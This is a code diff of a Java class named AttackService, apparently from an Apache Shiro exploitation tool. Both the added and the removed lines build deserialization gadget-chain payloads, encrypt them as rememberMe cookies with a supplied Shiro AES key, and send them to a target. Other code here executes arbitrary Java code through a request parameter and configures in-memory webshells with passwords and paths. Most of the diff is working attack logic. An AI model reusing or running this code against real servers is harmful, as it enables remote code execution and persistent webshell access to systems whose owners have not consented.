@@ -467,22 +467,15 @@ public class AttackService {
         String rememberMe = null;
 
         try {
-            AppLogger.info("GadgetPayload: gadget=" + gadgetOpt + ", echo=" + echoOpt);
             Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadgetOpt);
             if (gadgetClazz == null) {
-                AppLogger.info("GadgetPayload: resolvePayloadClass 返回 null");
                 Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("未找到利用链类: " + gadgetOpt)));
                 return null;
             }
-            AppLogger.info("GadgetPayload: gadgetClazz=" + gadgetClazz.getName());
             ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
-            AppLogger.info("GadgetPayload: 开始 createTemplatesImpl, echo=" + echoOpt);
             Object template = Gadgets.createTemplatesImpl(echoOpt);
-            AppLogger.info("GadgetPayload: template created, class=" + template.getClass().getName());
             Object chainObject = gadgetPayload.getObject(template);
-            AppLogger.info("GadgetPayload: chainObject created, class=" + chainObject.getClass().getName());
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
-            AppLogger.info("GadgetPayload: rememberMe length=" + (rememberMe != null ? rememberMe.length() : 0) + ", aesGcmCipherType=" + aesGcmCipherType);
         } catch (Throwable var9) {
             var9.printStackTrace();
             String msg = var9.getMessage();
@@ -505,34 +498,6 @@ public class AttackService {
         try {
             return (Class<? extends ObjectPayload>) Class.forName("com.summersec.attack.deser.payloads." + className);
         } catch (Throwable ignored) {
-            return null;
-        }
-    }
-
-    /**
-     * 将 yv66vg 开头的 Base64 类字节码封装为 Shiro rememberMe Cookie。
-     * 用于 jEG 回显和 jMG 内存马的统一注入路径。
-     *
-     * @param classBytesBase64 yv66vg 开头的 Base64 类字节码
-     * @param gadget           利用链名（如 CB1_183、CCK1 等）
-     * @param shiroKey         Shiro AES key（Base64）
-     * @return rememberMe Cookie 行（含 rememberMe= 前缀），封装失败返回 null
-     */
-    public String wrapClassBytesAsRememberMe(String classBytesBase64, String gadget, String shiroKey) {
-        if (classBytesBase64 == null || !classBytesBase64.startsWith("yv66vg")) {
-            return null;
-        }
-        try {
-            byte[] classBytes = Base64.decode(classBytesBase64.trim());
-            Object template = Gadgets.createTemplatesImpl(classBytes);
-            Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadget);
-            if (gadgetClazz == null) {
-                return null;
-            }
-            ObjectPayload<?> gp = gadgetClazz.newInstance();
-            Object chainObject = gp.getObject(template);
-            return shiro.sendpayload(chainObject, "rememberMe", shiroKey);
-        } catch (Exception e) {
             return null;
         }
     }
@@ -839,12 +804,6 @@ public class AttackService {
         header.put("path", shellPath != null ? shellPath : "");
         try {
             String postString = "user=" + userPart;
-            if (shellPass != null && !shellPass.isEmpty()) {
-                postString += "&p=" + shellPass;
-            }
-            if (shellPath != null && !shellPath.isEmpty()) {
-                postString += "&path=" + shellPath;
-            }
             String result = this.bodyHttpRequest(header, postString);
             if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
                 String httpAddress = Utils.UrlToDomain(this.url);
@@ -1080,53 +1039,6 @@ public class AttackService {
         }
     }
 
-    /**
-     * MODEL_CODE 模式注入：发送 rememberMe Cookie + 代码参数。
-     * jEG MODEL_CODE 将代码嵌入模板的 setReqParamName，目标回显类从该请求参数读取代码并执行。
-     *
-     * @param cookieLine     rememberMe Cookie 行
-     * @param codeParamName  代码参数名（jEG setReqParamName 设定值）
-     * @param code           要执行的 Java 代码
-     * @param sink           日志输出区
-     * @return HTTP 响应，失败返回 null
-     */
-    public String sendRememberMeCookieExploitWithCode(String cookieLine, String codeParamName, String code, TextArea sink) {
-        if (cookieLine == null || cookieLine.trim().isEmpty()) {
-            return null;
-        }
-        if (code == null || code.trim().isEmpty()) {
-            return sendRememberMeCookieExploit(cookieLine, sink);
-        }
-        String c = cookieLine.trim();
-        HashMap<String, String> header = new HashMap<String, String>();
-        header.put("Cookie", c);
-        TextArea logArea = sink != null ? sink : this.mainController.logTextArea;
-        try {
-            String postBody = codeParamName != null && !codeParamName.trim().isEmpty()
-                    ? codeParamName.trim() + "=" + code.trim()
-                    : code.trim();
-            String result = this.bodyHttpRequest(header, postBody);
-            appendResponseSummary(logArea, "[Cookie+CODE] 已发送 rememberMe 载荷，", result);
-            if (result != null) {
-                int idx = result.indexOf("\n\n");
-                if (idx >= 0) {
-                    String body = result.substring(idx + 2).trim();
-                    if (!body.isEmpty()) {
-                        logArea.appendText(Utils.log("[代码结果]\n" + body));
-                        logArea.appendText(Utils.log("-------------------------------------------------"));
-                        return body;
-                    }
-                }
-            }
-            logArea.appendText(Utils.log("[代码结果] (返回为空)"));
-            logArea.appendText(Utils.log("-------------------------------------------------"));
-            return result;
-        } catch (Exception e) {
-            logArea.appendText(Utils.log("[异常] " + e.getMessage()));
-            return null;
-        }
-    }
-
     public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
                                                          String legacyGadget, String legacyEcho, String shiroKey,
                                                          String jegCmdText, String jegCodeText) {
@@ -1164,12 +1076,22 @@ public class AttackService {
                 this.mainController.logTextArea.appendText(Utils.log(diag));
                 this.mainController.InjOutputArea.appendText(Utils.log(diag));
                 if (raw != null && raw.length() > 80 && raw.startsWith("yv66vg")) {
-                    String rememberMe = wrapClassBytesAsRememberMe(raw, legacyGadget, shiroKey);
-                    if (rememberMe != null && !rememberMe.isEmpty()) {
-                        this.mainController.logTextArea.appendText(Utils.log("[jEG] 已封装，rememberMe length=" + rememberMe.length()));
-                        return EchoGenerateResult.ok("jEG", rememberMe, "Cookie");
+                    try {
+                        byte[] classBytes = Base64.decode(raw.trim());
+                        Object template = Gadgets.createTemplatesImpl(classBytes);
+                        System.out.println("[jEG] template created, class=" + template.getClass().getName());
+                        Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(legacyGadget);
+                        this.mainController.logTextArea.appendText(Utils.log("[jEG] gadgetClazz=" + (gadgetClazz != null ? gadgetClazz.getName() : "null")));
+                        if (gadgetClazz != null) {
+                            ObjectPayload<?> gp = gadgetClazz.newInstance();
+                            Object chainObject = gp.getObject(template);
+                            String rememberMe = shiro.sendpayload(chainObject, "rememberMe", shiroKey);
+                            this.mainController.logTextArea.appendText(Utils.log("[jEG] 已封装，rememberMe length=" + (rememberMe != null ? rememberMe.length() : 0)));
+                            return EchoGenerateResult.ok("jEG", rememberMe, "Cookie");
+                        }
+                    } catch (Exception e) {
+                        this.mainController.logTextArea.appendText(Utils.log("[jEG] 封装失败: " + e.getMessage()));
                     }
-                    this.mainController.logTextArea.appendText(Utils.log("[jEG] 封装失败"));
                 }
                 String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                 if (rememberMe != null && !rememberMe.isEmpty()) {
@@ -1184,22 +1106,8 @@ public class AttackService {
     }
 
     public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
-                                                                  String shellType, String formatType,
-                                                                  String gadgetType, String legacyMemshellOption) {
-        return generateMemshellWithThirdParty(source, toolType, serverType, shellType, formatType, gadgetType, legacyMemshellOption, null, null, null);
-    }
-
-    public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
-                                                                  String shellType, String formatType,
-                                                                  String gadgetType, String legacyMemshellOption,
-                                                                  String pass, String path) {
-        return generateMemshellWithThirdParty(source, toolType, serverType, shellType, formatType, gadgetType, legacyMemshellOption, pass, path, null);
-    }
-
-    public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
-                                                                  String shellType, String formatType,
-                                                                  String gadgetType, String legacyMemshellOption,
-                                                                  String pass, String path, String key) {
+                                                                 String shellType, String formatType,
+                                                                 String gadgetType, String legacyMemshellOption) {
         try {
             if (source == null || source.trim().isEmpty()) {
                 source = "Legacy";
@@ -1211,9 +1119,6 @@ public class AttackService {
             request.setFormatType(formatType);
             request.setGadgetType(gadgetType);
             request.setOption(legacyMemshellOption);
-            request.setPass(pass);
-            request.setPath(path);
-            request.setKey(key);
             MemshellGenerateResult result = generatorFacade.generateMemshell(source, request)
                     .withSelection(toolType, serverType, shellType, formatType, gadgetType);
             if (!result.isSuccess() && !"Legacy".equalsIgnoreCase(source)) {
